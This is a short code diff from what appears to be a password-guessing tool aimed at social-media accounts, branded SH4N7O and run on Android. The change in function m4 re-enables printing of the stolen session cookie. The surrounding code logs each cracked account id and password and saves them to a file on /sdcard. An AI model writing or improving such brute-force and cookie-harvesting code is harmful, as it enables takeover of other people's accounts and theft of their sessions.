@@ -362,7 +362,7 @@ def m4(ids,names,passlist):
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [SH4N7O\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
-                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/SH4N7O•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
